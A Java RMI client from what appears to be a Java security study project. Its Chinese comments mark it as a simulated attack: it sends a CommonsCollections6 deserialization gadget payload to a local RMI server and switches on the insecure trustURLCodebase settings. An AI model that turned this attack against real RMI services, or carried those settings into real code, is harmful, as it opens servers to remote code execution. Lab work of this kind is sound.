package com.pinger.javasec.rmi.basic;

import com.pinger.javasec.common.CC6;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.Serializable;

/**
 * @author : p1n93r
 * @date : 2021/3/30 15:46
 * RMI客户端
 */
public class RmiClient {

    /**
     * 模拟攻击服务端：Object类型的形参
     */
    public static void attackServer() throws Exception{
        String uri = "rmi://127.0.0.1:1099/Hello";
        Context ctx = new InitialContext();
        Object remote = ctx.lookup(uri);
        RmiServer.IRemoteHelloWorld remoteObj = (RmiServer.IRemoteHelloWorld) remote;
        remoteObj.poke(CC6.getPayload());
    }


    /**
     * 模拟攻击服务端：Serializable类型的形参
     */
    public static void attackServer1() throws Exception{
        String uri = "rmi://127.0.0.1:1099/Hello";
        Context ctx = new InitialContext();
        Object remote = ctx.lookup(uri);
        RmiServer.IRemoteHelloWorld remoteObj = (RmiServer.IRemoteHelloWorld) remote;
        remoteObj.getQuiet((Serializable) CC6.getPayload());
    }




    public static void main(String[] args)  throws Exception {

        // 为了方便调试，直接开启urlcodebase
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        // 测试
        attackServer1();

    }
}
